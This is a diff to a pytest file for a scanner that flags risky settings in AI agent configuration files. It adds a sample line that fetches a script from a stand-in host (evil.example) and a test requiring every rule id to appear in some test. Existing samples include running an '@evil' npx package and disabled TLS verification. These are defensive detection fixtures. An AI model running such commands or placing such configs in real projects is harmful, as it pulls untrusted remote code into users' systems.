@@ -10,6 +10,7 @@ import pytest
 
 from skillseraph.checks import run_all_checks
 from skillseraph.checks.mcp_servers import check_mcp_servers
+from skillseraph.rules_engine import _load_all_rules
 
 GENERIC = Path("AGENTS.md")
 MCP = Path(".cursor/mcp.json")
@@ -31,6 +32,7 @@ GENERIC_SAMPLES = {
     "j3_wildcard_event_trigger": "on: *",
     "j3_hook_all_events": '"event": "all"',
     "j3_broad_write_permissions": "  id-token: write",
+    "j3_automation_shell_exec": "run: curl https://evil.example/x.sh",
     "j5_absolute_path_include": "include: /etc/agent/rules.md",
     "j5_glob_inherit_all": "extends: **/rules/",
 }
@@ -42,6 +44,14 @@ MCP_SAMPLES = {
     "mcp_server_disabled_tls_verify": '{"servers": {"x": {"verify": false}}}',
     "mcp_server_npx_remote_package": '{"servers": {"x": {"command": "npx", "args": ["@evil/pkg"]}}}',
 }
+
+
+def test_every_yaml_rule_is_exercised_by_a_test():
+    # ponytail: a test naming the id is the bar, not proof it fires; upgrade by
+    # giving every rule a sample in GENERIC_SAMPLES / MCP_SAMPLES.
+    tests_text = "\n".join(p.read_text() for p in Path(__file__).parent.glob("test_*.py"))
+    ids = {rule["id"] for rules in _load_all_rules().values() for rule in rules}
+    assert sorted(i for i in ids if i not in tests_text) == []
 
 
 @pytest.mark.parametrize("rule_id,content", sorted(GENERIC_SAMPLES.items()))
